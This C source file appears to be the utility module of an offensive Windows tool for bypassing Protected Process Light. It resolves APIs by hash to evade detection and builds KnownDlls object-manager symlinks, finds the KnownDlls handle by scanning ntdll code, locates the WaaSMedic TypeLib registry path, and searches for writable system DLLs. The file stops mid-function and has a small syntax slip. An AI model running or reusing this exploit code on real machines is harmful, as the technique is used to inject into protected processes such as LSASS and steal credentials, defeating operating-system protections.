#include "ppl/ppl_utils.h"

BOOL is_win_6_point_3_or_grater(VOID)
{
    PVOID pPeb;
    ULONG32 OSMajorVersion;
    ULONG32 OSMinorVersion;

    pPeb = (PVOID)READ_MEMLOC(PEB_OFFSET);
    OSMajorVersion = *RVA(PULONG32, pPeb, OSMAJORVERSION_OFFSET);
    OSMinorVersion = *RVA(PULONG32, pPeb, OSMINORVERSION_OFFSET);

    if (OSMajorVersion > 6)
        return TRUE;

    if (OSMajorVersion < 6)
        return FALSE;

    if (OSMinorVersion >= 3)
        return TRUE;

    return FALSE;
}

BOOL is_win_10_or_grater(VOID)
{
    PVOID pPeb;
    ULONG32 OSMajorVersion;

    pPeb = (PVOID)READ_MEMLOC(PEB_OFFSET);
    OSMajorVersion = *RVA(PULONG32, pPeb, OSMAJORVERSION_OFFSET);

    if (OSMajorVersion >= 10)
        return TRUE;

    return FALSE;
}

BOOL object_manager_create_directory(
    IN LPWSTR dirname,
    OUT PHANDLE phDirectory)
{
    OBJECT_ATTRIBUTES oa = { 0 };
    UNICODE_STRING name = { 0 };
    NTSTATUS status = 0;

    *phDirectory = NULL;

    name.Buffer  = dirname;
    name.Length  = (USHORT)wcsnlen(name.Buffer, MAX_PATH);;
    name.Length *= 2;
    name.MaximumLength = name.Length + 2;
    InitializeObjectAttributes(&oa, &name, OBJ_CASE_INSENSITIVE, NULL, NULL);

    status = NtCreateDirectoryObjectEx(
        phDirectory,
        DIRECTORY_ALL_ACCESS,
        &oa,
        NULL,
        FALSE);
    // if we get STATUS_OBJECT_NAME_COLLISION, assume is already created
    if (status != STATUS_OBJECT_NAME_COLLISION && !NT_SUCCESS(status))
    {
        syscall_failed("NtCreateDirectoryObjectEx", status);
        return FALSE;
    }

    return TRUE;
}

BOOL object_manager_create_symlik(
    IN LPWSTR linkname,
    IN LPWSTR targetname,
    OUT PHANDLE phLink)
{
    OBJECT_ATTRIBUTES oa = { 0 };
    UNICODE_STRING name = { 0 };
    UNICODE_STRING target = { 0 };
    NTSTATUS status;

    *phLink = NULL;

    name.Buffer  = linkname;
    name.Length  = (USHORT)wcsnlen(name.Buffer, MAX_PATH);;
    name.Length *= 2;
    name.MaximumLength = name.Length + 2;

    target.Buffer  = targetname;
    target.Length  = (USHORT)wcsnlen(target.Buffer, MAX_PATH);;
    target.Length *= 2;
    target.MaximumLength = target.Length + 2;

    InitializeObjectAttributes(&oa, &name, OBJ_CASE_INSENSITIVE, NULL, NULL);

    status = NtCreateSymbolicLinkObject(
        phLink,
        SYMBOLIC_LINK_ALL_ACCESS,
        &oa,
        &target);
    // if we get STATUS_OBJECT_NAME_COLLISION, assume is already created
    if (status != STATUS_OBJECT_NAME_COLLISION && !NT_SUCCESS(status))
    {
        syscall_failed("NtCreateSymbolicLinkObject", status);
        return FALSE;
    }

    return TRUE;
}

BOOL check_known_dll_symbolic_link(
    IN LPCWSTR pwszDllName,
    IN LPWSTR pwszTarget)
{
    BOOL bReturnValue = FALSE;
    NTSTATUS status = 0;
    LPWSTR pwszLinkName = NULL;
    OBJECT_ATTRIBUTES oa = { 0 };
    UNICODE_STRING name = { 0 };
    UNICODE_STRING target = { 0 };
    LPWSTR pwszTargetLocal = NULL;
    HANDLE hLink = NULL;
    ULONG length = 0;

    pwszLinkName = intAlloc((MAX_PATH + 1) * sizeof(WCHAR));
    if (!pwszLinkName)
    {
        malloc_failed();
        goto end;
    }

    pwszTargetLocal = intAlloc((MAX_PATH + 1) * sizeof(WCHAR));
    if (!pwszTargetLocal)
    {
        malloc_failed();
        goto end;
    }

    wcsncpy(pwszLinkName, L"\\KnownDlls\\", MAX_PATH);
    wcsncat(pwszLinkName, pwszDllName, MAX_PATH);

    name.Buffer  = pwszLinkName;
    name.Length  = (USHORT)wcsnlen(name.Buffer, MAX_PATH);;
    name.Length *= 2;
    name.MaximumLength = name.Length + 2;
    InitializeObjectAttributes(&oa, &name, OBJ_CASE_INSENSITIVE, NULL, NULL);

    status = NtOpenSymbolicLinkObject(
        &hLink,
        SYMBOLIC_LINK_QUERY,
        &oa);
    if (!NT_SUCCESS(status))
    {
        syscall_failed("NtOpenSymbolicLinkObject", status);
        goto end;
    }

    target.Buffer = pwszTargetLocal;
    target.Length = 0;
    target.MaximumLength = (MAX_PATH + 1) * sizeof(WCHAR);

    status = NtQuerySymbolicLinkObject(
        hLink,
        &target,
        &length);
    if (!NT_SUCCESS(status))
    {
        syscall_failed("NtQuerySymbolicLinkObject", status);
        goto end;
    }

    bReturnValue = _wcsicmp(target.Buffer, pwszTarget) == 0;

end:
    if (pwszLinkName)
    {
        DATA_FREE(pwszLinkName, wcslen(pwszLinkName) * sizeof(WCHAR));
    }
    if (pwszTargetLocal)
    {
        DATA_FREE(pwszTargetLocal, wcslen(pwszTargetLocal) * sizeof(WCHAR));
    }
    if (hLink)
        NtClose(hLink);

    return bReturnValue;
}

BOOL get_file_size(
    IN HANDLE hFile,
    OUT PDWORD file_size)
{
    NTSTATUS status;
    IO_STATUS_BLOCK IoStatusBlock;
    FILE_STANDARD_INFORMATION fsi = { 0 };

    if (!hFile)
        return FALSE;

    status = NtQueryInformationFile(
        hFile,
        &IoStatusBlock,
        &fsi,
        sizeof(FILE_STANDARD_INFORMATION),
        FileStandardInformation);
    if (!NT_SUCCESS(status))
    {
        syscall_failed("NtQueryInformationFile", status);
        return FALSE;
    }

    // TODO: get the full QuadPart?
    *file_size = fsi.AllocationSize.LowPart;

    return TRUE;
}

BOOL query_service_status_process_by_handle(
    IN SC_HANDLE ServiceHandle,
    IN OUT LPSERVICE_STATUS_PROCESS ServiceStatus)
{
    BOOL  ret_val       = FALSE;
    BOOL  success       = FALSE;
    DWORD dwBytesNeeded = 0;

    QueryServiceStatusEx_t QueryServiceStatusEx = NULL;

    QueryServiceStatusEx = (QueryServiceStatusEx_t)(ULONG_PTR)get_function_address(
        get_library_address(ADVAPI32_DLL, TRUE),
        QueryServiceStatusEx_SW2_HASH,
        0);
    if (!QueryServiceStatusEx)
    {
        api_not_found("QueryServiceStatusEx");
        goto cleanup;
    }

    memset(ServiceStatus, 0, sizeof(*ServiceStatus));

    success = QueryServiceStatusEx(
        ServiceHandle,
        SC_STATUS_PROCESS_INFO,
        (LPBYTE)ServiceStatus,
        sizeof(*ServiceStatus),
        &dwBytesNeeded);
    if (!success)
    {
        function_failed("QueryServiceStatusEx");
        goto cleanup;
    }

    ret_val = TRUE;

cleanup:
    return ret_val;
}

BOOL get_service_handle(
    IN LPCWSTR ServiceName,
    IN DWORD DesiredAccess,
    OUT LPSC_HANDLE ServiceHandle)
{
    BOOL                 ret_val            = FALSE;
    SC_HANDLE            hSCM               = NULL;
    OpenSCManagerW_t     OpenSCManagerW     = NULL;
    OpenServiceW_t       OpenServiceW       = NULL;
    CloseServiceHandle_t CloseServiceHandle = NULL;

    OpenSCManagerW = (OpenSCManagerW_t)(ULONG_PTR)get_function_address(
        get_library_address(ADVAPI32_DLL, TRUE),
        OpenSCManagerW_SW2_HASH,
        0);
    if (!OpenSCManagerW)
    {
        api_not_found("OpenSCManagerW");
        goto cleanup;
    }

    OpenServiceW = (OpenServiceW_t)(ULONG_PTR)get_function_address(
        get_library_address(ADVAPI32_DLL, TRUE),
        OpenServiceW_SW2_HASH,
        0);
    if (!OpenServiceW)
    {
        api_not_found("OpenServiceW");
        goto cleanup;
    }

    CloseServiceHandle = (CloseServiceHandle_t)(ULONG_PTR)get_function_address(
        get_library_address(ADVAPI32_DLL, TRUE),
        CloseServiceHandle_SW2_HASH,
        0);
    if (!CloseServiceHandle)
    {
        api_not_found("CloseServiceHandle");
        goto cleanup;
    }

    *ServiceHandle = NULL;

    hSCM = OpenSCManagerW(NULL, SERVICES_ACTIVE_DATABASEW, SC_MANAGER_CONNECT);
    if (!hSCM)
    {
        function_failed("OpenSCManagerW");
        goto cleanup;
    }

    *ServiceHandle = OpenServiceW(hSCM, ServiceName, DesiredAccess);
    if (!*ServiceHandle)
    {
        function_failed("OpenSCManagerW");
        goto cleanup;
    }
    
    ret_val = TRUE;

cleanup:
    if (hSCM)
        CloseServiceHandle(hSCM);

    return ret_val;
}

BOOL query_service_status_process_by_name(
    IN LPCWSTR ServiceName,
    IN OUT LPSERVICE_STATUS_PROCESS ServiceStatus)
{
    BOOL ret_val = FALSE;
    BOOL success = FALSE;
    SC_HANDLE hService = NULL;

    CloseServiceHandle_t CloseServiceHandle = NULL;

    CloseServiceHandle = (CloseServiceHandle_t)(ULONG_PTR)get_function_address(
        get_library_address(ADVAPI32_DLL, TRUE),
        CloseServiceHandle_SW2_HASH,
        0);
    if (!CloseServiceHandle)
    {
        api_not_found("CloseServiceHandle");
        goto cleanup;
    }

    success = get_service_handle(ServiceName, SERVICE_QUERY_STATUS, &hService);
    if (!success)
        goto cleanup;

    success = query_service_status_process_by_handle(hService, ServiceStatus);
    if (!success)
        goto cleanup;

    ret_val = TRUE;

cleanup:
    if (hService) CloseServiceHandle(hService);

    return ret_val;
}

BOOL get_service_status_by_name(
    IN LPCWSTR ServiceName,
    OUT LPDWORD Status)
{
    BOOL ret_val = FALSE;
    SERVICE_STATUS_PROCESS ssp;

    *Status = 0;

    ret_val = query_service_status_process_by_name(ServiceName, &ssp);
    *Status = ssp.dwCurrentState;

    if (ret_val)
    {
        DPRINT("State of service with name '%ls': %ld", ServiceName, *Status);
    }

    return ret_val;
}

// https://docs.microsoft.com/en-us/windows/win32/services/stopping-a-service
BOOL stop_service_by_name(
    IN LPCWSTR ServiceName,
    IN BOOL Wait)
{
    BOOL                   ret_val        = FALSE;
    BOOL                   success        = FALSE;
    SC_HANDLE              hService       = NULL;
    SERVICE_STATUS_PROCESS ssp            = { 0 };
    DWORD64                dwStartTime    = 0;
    DWORD                  dwWaitTime     = 0;

    GetTickCount64_t     GetTickCount64     = NULL;
    ControlService_t     ControlService     = NULL;
    Sleep_t              Sleep              = NULL;
    CloseServiceHandle_t CloseServiceHandle = NULL;

    GetTickCount64 = (GetTickCount64_t)(ULONG_PTR)get_function_address(
        get_library_address(KERNEL32_DLL, TRUE),
        GetTickCount64_SW2_HASH,
        0);
    if (!GetTickCount64)
    {
        api_not_found("GetTickCount64");
        goto cleanup;
    }

    ControlService = (ControlService_t)(ULONG_PTR)get_function_address(
        get_library_address(ADVAPI32_DLL, TRUE),
        ControlService_SW2_HASH,
        0);
    if (!ControlService)
    {
        api_not_found("ControlService");
        goto cleanup;
    }

    Sleep = (Sleep_t)(ULONG_PTR)get_function_address(
        get_library_address(KERNEL32_DLL, TRUE),
        Sleep_SW2_HASH,
        0);
    if (!Sleep)
    {
        api_not_found("Sleep");
        goto cleanup;
    }

    CloseServiceHandle = (CloseServiceHandle_t)(ULONG_PTR)get_function_address(
        get_library_address(ADVAPI32_DLL, TRUE),
        CloseServiceHandle_SW2_HASH,
        0);
    if (!CloseServiceHandle)
    {
        api_not_found("CloseServiceHandle");
        goto cleanup;
    }

    dwStartTime = GetTickCount64();

    success = get_service_handle(ServiceName, SERVICE_QUERY_STATUS | SERVICE_STOP, &hService);
    if (!success)
        goto cleanup;

    success = ControlService(hService, SERVICE_CONTROL_STOP, (LPSERVICE_STATUS)&ssp);
    if (!success)
        goto cleanup;

    success = query_service_status_process_by_handle(hService, &ssp);
    if (!success)
        goto cleanup;

    if (Wait)
    {
        DPRINT("Stopping service %ls...", ServiceName);

        while (ssp.dwCurrentState != SERVICE_STOPPED)
        {
            dwWaitTime = ssp.dwWaitHint / 10;

            if (dwWaitTime < 1000)
                dwWaitTime = 1000;
            else if (dwWaitTime > 10000)
                dwWaitTime = 10000;

            Sleep(dwWaitTime);

            if (!query_service_status_process_by_handle(hService, &ssp))
                break;

            if (GetTickCount64() - dwStartTime > TIMEOUT)
            {
                break;
            }
        }

        ret_val = ssp.dwCurrentState == SERVICE_STOPPED;
    }
    else
    {
        ret_val = TRUE;
    }

cleanup:
    if (hService) CloseServiceHandle(hService);

    if (!ret_val)
        DPRINT_ERR("Failed to stop service %ls.", ServiceName);

    return ret_val;
}

// https://docs.microsoft.com/en-us/windows/win32/services/starting-a-service
BOOL start_service_by_name(
    IN LPCWSTR ServiceName,
    IN BOOL Wait)
{
    BOOL                   ret_val        = FALSE;
    BOOL                   success        = FALSE;
    SC_HANDLE              hService       = NULL;
    SERVICE_STATUS_PROCESS ssp            = { 0 };
    DWORD64                dwStartTime    = 0;
    DWORD                  dwWaitTime     = 0;

    GetTickCount64_t     GetTickCount64     = NULL;
    StartServiceW_t      StartServiceW      = NULL;
    Sleep_t              Sleep              = NULL;
    CloseServiceHandle_t CloseServiceHandle = NULL;

    GetTickCount64 = (GetTickCount64_t)(ULONG_PTR)get_function_address(
        get_library_address(KERNEL32_DLL, TRUE),
        GetTickCount64_SW2_HASH,
        0);
    if (!GetTickCount64)
    {
        api_not_found("GetTickCount64");
        goto cleanup;
    }

    StartServiceW = (StartServiceW_t)(ULONG_PTR)get_function_address(
        get_library_address(ADVAPI32_DLL, TRUE),
        StartServiceW_SW2_HASH,
        0);
    if (!StartServiceW)
    {
        api_not_found("StartServiceW");
        goto cleanup;
    }

    Sleep = (Sleep_t)(ULONG_PTR)get_function_address(
        get_library_address(KERNEL32_DLL, TRUE),
        Sleep_SW2_HASH,
        0);
    if (!Sleep)
    {
        api_not_found("Sleep");
        goto cleanup;
    }

    CloseServiceHandle = (CloseServiceHandle_t)(ULONG_PTR)get_function_address(
        get_library_address(ADVAPI32_DLL, TRUE),
        CloseServiceHandle_SW2_HASH,
        0);
    if (!CloseServiceHandle)
    {
        api_not_found("CloseServiceHandle");
        goto cleanup;
    }

    dwStartTime = GetTickCount64();

    success = get_service_handle(ServiceName, SERVICE_QUERY_STATUS | SERVICE_START, &hService);
    if (!success)
        goto cleanup;

    success = StartServiceW(hService, 0, NULL);
    if (!success)
        goto cleanup;

    success = query_service_status_process_by_handle(hService, &ssp);
    if (!success)
        goto cleanup;

    if (Wait)
    {
        while (ssp.dwCurrentState != SERVICE_RUNNING)
        {
            dwWaitTime = ssp.dwWaitHint / 10;

            if (dwWaitTime < 1000)
                dwWaitTime = 1000;
            else if (dwWaitTime > 10000)
                dwWaitTime = 10000;

            Sleep(dwWaitTime);

            if (!query_service_status_process_by_handle(hService, &ssp))
                break;

            if (GetTickCount64() - dwStartTime > TIMEOUT)
            {
                break;
            }
        }

        ret_val = ssp.dwCurrentState == SERVICE_RUNNING;
    }
    else
    {
        ret_val = TRUE;
    }

cleanup:
    if (hService) CloseServiceHandle(hService);

    return ret_val;
}

BOOL get_service_process_id(
    IN LPCWSTR ServiceName,
    OUT LPDWORD ProcessId)
{
    BOOL                   ret_val = FALSE;
    SERVICE_STATUS_PROCESS ssp     = { 0 };

    *ProcessId = 0;

    ret_val = query_service_status_process_by_name(ServiceName, &ssp);
    *ProcessId = ssp.dwProcessId;

    if (ret_val)
    {
        DPRINT("PID of service with name '%ls': %ld", ServiceName, *ProcessId);
    }

    return ret_val;
}

VOID safe_free(
    IN PVOID* Memory)
{
    if (Memory && *Memory)
    {
        intFree(*Memory);
        *Memory = NULL;
    }
}

VOID safe_release(
    IN IUnknown** Interface)
{
    if (Interface && *Interface)
    {
        (*Interface)->lpVtbl->Release((*Interface));
        *Interface = NULL;
    }
}

BOOL get_type_lib_reg_value_path(
    OUT LPWSTR* TypeLibRegValuePath)
{
    BOOL       ret_val          = FALSE;
    BOOL       success          = FALSE;
    LPWSTR     pwszRegPath      = NULL;
    LPWSTR     pwszTypeLibGuid  = NULL;
    RPC_WSTR   InterfaceGuidStr = NULL;
    UUID       InterfaceGuid    = IID_WAASREMEDIATIONEX;
    RPC_STATUS rpc_status       = RPC_S_OK;

    UuidToStringW_t  UuidToStringW  = NULL;
    RpcStringFreeW_t RpcStringFreeW = NULL;

    UuidToStringW = (UuidToStringW_t)(ULONG_PTR)get_function_address(
        get_library_address(RPCRT4_DLL, TRUE),
        UuidToStringW_SW2_HASH,
        0);
    if (!UuidToStringW)
    {
        api_not_found("UuidToStringW");
        goto cleanup;
    }

    RpcStringFreeW = (RpcStringFreeW_t)(ULONG_PTR)get_function_address(
        get_library_address(RPCRT4_DLL, TRUE),
        RpcStringFreeW_SW2_HASH,
        0);
    if (!RpcStringFreeW)
    {
        api_not_found("RpcStringFreeW");
        goto cleanup;
    }

    //
    // HKLM\SOFTWARE\Classes\Interface\{B4C1D279-966E-44E9-A9C5-CCAF4A77023D}\TypeLib
    //      (Default) -> {3ff1aab8-f3d8-11d4-825d-00104b3646c0}
    // HKLM\SOFTWARE\Classes\TypeLib\{3ff1aab8-f3d8-11d4-825d-00104b3646c0}\1.0\0\Win64
    //      (Default) -> %SystemRoot%\system32\WaaSMedicPS.dll
    //

    pwszRegPath = intAlloc((MAX_PATH + 1) * sizeof(WCHAR));
    if (!pwszRegPath)
    {
        malloc_failed();
        goto cleanup;
    }

    rpc_status = UuidToStringW(&InterfaceGuid, &InterfaceGuidStr);
    if (rpc_status != RPC_S_OK)
    {
        function_failed("UuidToStringW");
        goto cleanup;
    }

    swprintf_s(pwszRegPath, MAX_PATH, L"SOFTWARE\\Classes\\Interface\\{%ws}\\TypeLib", (LPWSTR)InterfaceGuidStr);

    success = get_registry_string_value(HKEY_LOCAL_MACHINE, pwszRegPath, NULL, &pwszTypeLibGuid);
    if (!success)
        goto cleanup;

    *TypeLibRegValuePath = intAlloc(MAX_PATH + 2);
    if (!*TypeLibRegValuePath)
    {
        malloc_failed();
        goto cleanup;
    }

    swprintf_s(*TypeLibRegValuePath, MAX_PATH, L"SOFTWARE\\Classes\\TypeLib\\%ws\\1.0\\0\\Win64", pwszTypeLibGuid);

    ret_val = TRUE;

cleanup:
    if (InterfaceGuidStr) RpcStringFreeW(&InterfaceGuidStr);
    safe_free((PVOID*)&pwszTypeLibGuid);
    safe_free((PVOID*)&pwszRegPath);

    if (!ret_val && *TypeLibRegValuePath)
    {
        intFree(*TypeLibRegValuePath);
        *TypeLibRegValuePath = NULL;
    }

    if (ret_val)
    {
        DPRINT("Path: %ls", *TypeLibRegValuePath);
    }

    return ret_val;
}

BOOL set_registry_string_value(
    IN HKEY Key,
    IN LPCWSTR SubKey,
    IN LPCWSTR ValueName,
    IN LPCWSTR ValueData)
{
    BOOL    ret_val    = FALSE;
    LSTATUS status     = ERROR_SUCCESS;
    HKEY    hKey       = NULL;
    DWORD   dwDataSize = 0;

    RegSetValueExW_t RegSetValueExW = NULL;
    RegOpenKeyExW_t  RegOpenKeyExW  = NULL;
    RegCloseKey_t    RegCloseKey    = NULL;

    RegSetValueExW = get_function_address(
        get_library_address(ADVAPI32_DLL, TRUE),
        RegSetValueExW_SW2_HASH,
        0);
    if (!RegSetValueExW)
    {
        api_not_found("RegSetValueExW");
        goto cleanup;
    }

    RegOpenKeyExW = get_function_address(
        get_library_address(ADVAPI32_DLL, TRUE),
        RegOpenKeyExW_SW2_HASH,
        0);
    if (!RegOpenKeyExW)
    {
        api_not_found("RegOpenKeyExW");
        goto cleanup;
    }

    RegCloseKey = get_function_address(
        get_library_address(ADVAPI32_DLL, TRUE),
        RegCloseKey_SW2_HASH,
        0);
    if (!RegCloseKey)
    {
        api_not_found("RegCloseKey");
        goto cleanup;
    }

    dwDataSize = ((DWORD)wcslen(ValueData) + 1) * sizeof(WCHAR);

    status = RegOpenKeyExW(Key, SubKey, 0, KEY_SET_VALUE, &hKey);
    if (status != ERROR_SUCCESS)
    {
        function_failed("RegOpenKeyExW");
        goto cleanup;
    }

    status = RegSetValueExW(hKey, ValueName, 0, REG_SZ, (BYTE*)ValueData, dwDataSize);
    if (status != ERROR_SUCCESS)
    {
        function_failed("RegSetValueExW");
        goto cleanup;
    }

    ret_val = TRUE;

cleanup:
    if (hKey)
        RegCloseKey(hKey);

    if (ret_val)
    {
        DPRINT("Key: %ls | Value: %ls | Data: %ls", SubKey, ValueName, ValueData);
    }

    return ret_val;
}

BOOL get_registry_string_value(
    IN HKEY Key,
    IN LPCWSTR SubKey,
    IN LPCWSTR ValueName,
    OUT LPWSTR* ValueData)
{
    BOOL    ret_val        = FALSE;
    LSTATUS status         = ERROR_SUCCESS;
    HKEY    hKey           = NULL;
    DWORD   dwDataSize     = 0;
    LPWSTR  pwszStringData = NULL;

    RegOpenKeyExW_t    RegOpenKeyExW    = NULL;
    RegQueryValueExW_t RegQueryValueExW = NULL;
    RegCloseKey_t      RegCloseKey      = NULL;

    RegOpenKeyExW = get_function_address(
        get_library_address(ADVAPI32_DLL, TRUE),
        RegOpenKeyExW_SW2_HASH,
        0);
    if (!RegOpenKeyExW)
    {
        api_not_found("RegOpenKeyExW");
        goto cleanup;
    }

    RegQueryValueExW = get_function_address(
        get_library_address(ADVAPI32_DLL, TRUE),
        RegQueryValueExW_SW2_HASH,
        0);
    if (!RegQueryValueExW)
    {
        api_not_found("RegQueryValueExW");
        goto cleanup;
    }

    RegCloseKey = get_function_address(
        get_library_address(ADVAPI32_DLL, TRUE),
        RegCloseKey_SW2_HASH,
        0);
    if (!RegCloseKey)
    {
        api_not_found("RegCloseKey");
        goto cleanup;
    }

    status = RegOpenKeyExW(Key, SubKey, 0, KEY_QUERY_VALUE, &hKey);
    if (status != ERROR_SUCCESS)
    {
        function_failed("RegOpenKeyExW");
        goto cleanup;
    }

    status = RegQueryValueExW(hKey, ValueName, NULL, NULL, NULL, &dwDataSize);
    if (status != ERROR_SUCCESS)
    {
        function_failed("RegQueryValueExW");
        goto cleanup;
    }

    pwszStringData = intAlloc(dwDataSize);
    if (!pwszStringData)
    {
        malloc_failed();
        goto cleanup;
    }
    
    status = RegQueryValueExW(hKey, ValueName, NULL, NULL, (LPBYTE)pwszStringData, &dwDataSize);
    if (status != ERROR_SUCCESS)
    {
        function_failed("RegQueryValueExW");
        goto cleanup;
    }
    
    *ValueData = pwszStringData;
    ret_val = TRUE;

cleanup:
    if (!ret_val && pwszStringData) intFree(pwszStringData);
    if (hKey) RegCloseKey(hKey);

    if (ret_val)
    {
        DPRINT("Key: %ls | Value: %ls | Data: %ls", SubKey, ValueName, pwszStringData);
    }

    return ret_val;
}


BOOL generate_temp_path(
    OUT LPWSTR* Buffer)
{
    BOOL   ret_val        = FALSE;
    DWORD  dwBufferLength = MAX_PATH + 1;
    LPWSTR pwszTempPath   = NULL;
    DWORD  dwRet          = 0;
    UINT   uintRet        = 0;

    GetTempPathW_t     GetTempPathW     = NULL;
    GetTempFileNameW_t GetTempFileNameW = NULL;

    GetTempPathW = (GetTempPathW_t)(ULONG_PTR)get_function_address(
        get_library_address(KERNEL32_DLL, TRUE),
        GetTempPathW_SW2_HASH,
        0);
    if (!GetTempPathW)
    {
        api_not_found("GetTempPathW");
        goto cleanup;
    }

    GetTempFileNameW = (GetTempFileNameW_t)(ULONG_PTR)get_function_address(
        get_library_address(KERNEL32_DLL, TRUE),
        GetTempFileNameW_SW2_HASH,
        0);
    if (!GetTempFileNameW)
    {
        api_not_found("GetTempFileNameW");
        goto cleanup;
    }

    pwszTempPath = intAlloc(dwBufferLength * sizeof(WCHAR));
    if (!pwszTempPath)
    {
        malloc_failed()
        goto cleanup;
    }

    *Buffer = intAlloc((MAX_PATH + 1) * sizeof(WCHAR));
    if (!*Buffer)
        goto cleanup;

    dwRet = GetTempPathW(dwBufferLength, pwszTempPath);
    if (!dwRet)
    {
        function_failed("GetTempPathW");
        goto cleanup;
    }

    uintRet = GetTempFileNameW(pwszTempPath, L"", 0, *Buffer);
    if (!uintRet)
    {
        function_failed("GetTempFileNameW");
        goto cleanup;
    }

    ret_val = TRUE;

cleanup:
    safe_free((PVOID*)&pwszTempPath);
    if (!ret_val)
        safe_free((PVOID*)Buffer);

    if (ret_val)
    {
        DPRINT("Temp path: %ls", *Buffer);
    }

    return ret_val;
}

BOOL get_known_dlls_handle_address(
    IN PVOID* KnownDllDirectoryHandleAddr)
{
    BOOL                     ret_val                      = FALSE;
    HMODULE                  hNtdll                       = NULL;
    DWORD                    i                            = 0;
    DWORD                    dwSectionSize                = 0;
    DWORD                    dwIndex                      = 0;
    DWORD                    dwMaxSize                    = 0x1000;
    DWORD                    dwCurrentCode                = 0;
    LPVOID                   pLdrGetKnownDllSectionHandle = NULL;
    LPVOID                   pSectionAddress              = NULL;
    LPVOID                   pKnownDllsHandleAddr         = NULL;
    LPVOID                   pDataAddr                    = NULL;
    PIMAGE_DOS_HEADER        DosHeader                    = NULL;
    PIMAGE_NT_HEADERS        NtHeaders                    = NULL;
    PIMAGE_SECTION_HEADER    SectionHeader                = NULL;
    POBJECT_NAME_INFORMATION ObjectInfo                   = NULL;

    hNtdll = get_library_address(NTDLL_DLL, TRUE);

    pLdrGetKnownDllSectionHandle = get_function_address(
        hNtdll,
        LdrGetKnownDllSectionHandle_SW2_HASH,
        0);
    if (!pLdrGetKnownDllSectionHandle)
    {
        api_not_found("LdrGetKnownDllSectionHandle");
        goto cleanup;
    }

    DosHeader     = (PIMAGE_DOS_HEADER)hNtdll;
    NtHeaders     = RVA(PIMAGE_NT_HEADERS, hNtdll, DosHeader->e_lfanew);
    SectionHeader = (PIMAGE_SECTION_HEADER)((LPBYTE)&NtHeaders->OptionalHeader + NtHeaders->FileHeader.SizeOfOptionalHeader);

    for (i = 0; i < NtHeaders->FileHeader.NumberOfSections; i++)
    {
        if (!memcmp((char*)SectionHeader[i].Name, ".data", 6))
        {
            pSectionAddress = RVA(PULONG_PTR, hNtdll, SectionHeader[i].VirtualAddress);
            dwSectionSize = SectionHeader[i].Misc.VirtualSize;
            break;
        }
    }

    if (pSectionAddress == 0 || dwSectionSize == 0)
    {
        DPRINT_ERR("Failed to find the .text section of ntdll");
        goto cleanup;
    }

    ObjectInfo = intAlloc(1024);
    if (!ObjectInfo)
    {
        malloc_failed();
        goto cleanup;
    }

    dwIndex = 0;
    do
    {
        // If we reach the RET instruction, we found the end of the function.
        if (*(PWORD)pLdrGetKnownDllSectionHandle == 0xccc3 || dwIndex >= dwMaxSize)
            break;

        // 1. Read the 4 bytes at the current position => Potential RIP relative offset.
        // 2. Add the offset to the current position => Absolute address.
        // 3. Check if the calculated address is in the .data section.
        // 4. If so, we have a candidate, check if we can find the \KnownDlls handle at this address.
        dwCurrentCode = *(PDWORD)pLdrGetKnownDllSectionHandle;
        pDataAddr = (PBYTE)pLdrGetKnownDllSectionHandle + sizeof(dwCurrentCode) + dwCurrentCode;
        if ((ULONG_PTR)pDataAddr >= (ULONG_PTR)pSectionAddress && (ULONG_PTR)pDataAddr < (ULONG_PTR)((PBYTE)pSectionAddress + dwSectionSize))
        {
            if (NT_SUCCESS(NtQueryObject_(*(LPHANDLE)pDataAddr, ObjectNameInformation, ObjectInfo, MAX_PATH, NULL)))
            {
                if (ObjectInfo->Name.Buffer && !wcscmp(ObjectInfo->Name.Buffer, STR_KNOWNDLLS))
                {
                    pKnownDllsHandleAddr = pDataAddr;
                    break;
                }
            }
        }

        pLdrGetKnownDllSectionHandle = (PBYTE)pLdrGetKnownDllSectionHandle + 1;
        dwIndex += 1;

    } while (!pKnownDllsHandleAddr);

    if (!pKnownDllsHandleAddr)
        goto cleanup;

    *KnownDllDirectoryHandleAddr = pKnownDllsHandleAddr;
    ret_val = TRUE;

cleanup:
    safe_free((PVOID*)&ObjectInfo);

    return ret_val;
}

VOID safe_close_handle(
    IN PHANDLE Handle)
{
    if (Handle && *Handle && *Handle != INVALID_HANDLE_VALUE)
    {
        NtClose(*Handle);
        *Handle = NULL;
    }
}

BOOL find_writable_system_dll(
    IN DWORD MinSize,
    OUT LPWSTR* FilePath)
{
    BOOL             ret_val                  = FALSE;
    BOOL             bCurrentDirectoryChanged = FALSE;
    LPWSTR           pwszCurrentDirectory     = NULL;
    LPWSTR           pwszSystemDirectory      = NULL;
    LPWSTR           pwszFilePath             = NULL;
    WIN32_FIND_DATAW wfd                      = { 0 };
    HANDLE           hFind                    = NULL;
    HANDLE           hFile                    = NULL;
    DWORD            dwFileSize               = 0;

    FindFirstFileW_t       FindFirstFileW       = NULL;
    FindNextFileW_t        FindNextFileW        = NULL;
    FindClose_t            FindClose            = NULL;
    GetCurrentDirectoryW_t GetCurrentDirectoryW = NULL;
    GetSystemDirectoryW_t  GetSystemDirectoryW  = NULL;
    SetCurrentDirectoryW_t SetCurrentDirectoryW = NULL;
    CreateFileW_t          CreateFileW          = NULL;
    GetFileSize_t          GetFileSize          = NULL;

    FindFirstFileW = (FindFirstFileW_t)(ULONG_PTR)get_function_address(
        get_library_address(KERNEL32_DLL, TRUE),
        FindFirstFileW_SW2_HASH,
        0);
    if (!FindFirstFileW)
    {
        api_not_found("FindFirstFileW");
        goto cleanup;
    }

    FindNextFileW = (FindNextFileW_t)(ULONG_PTR)get_function_address(
        get_library_address(KERNEL32_DLL, TRUE),
        FindNextFileW_SW2_HASH,
        0);
    if (!FindNextFileW)
    {
        api_not_found("FindNextFileW");
        goto cleanup;
    }

    FindClose = (FindClose_t)(ULONG_PTR)get_function_address(
        get_library_address(KERNEL32_DLL, TRUE),
        FindClose_SW2_HASH,
        0);
    if (!FindClose)
    {
        api_not_found("FindClose");
        goto cleanup;
    }

    GetCurrentDirectoryW = (GetCurrentDirectoryW_t)(ULONG_PTR)get_function_address(
        get_library_address(KERNEL32_DLL, TRUE),
        GetCurrentDirectoryW_SW2_HASH,
        0);
    if (!GetCurrentDirectoryW)
    {
        api_not_found("GetCurrentDirectoryW");
        goto cleanup;
    }

    SetCurrentDirectoryW = (SetCurrentDirectoryW_t)(ULONG_PTR)get_function_address(
        get_library_address(KERNEL32_DLL, TRUE),
        SetCurrentDirectoryW_SW2_HASH,
        0);
    if (!SetCurrentDirectoryW)
    {
        api_not_found("SetCurrentDirectoryW");
        goto cleanup;
    }

    GetSystemDirectoryW = (GetSystemDirectoryW_t)(ULONG_PTR)get_function_address(
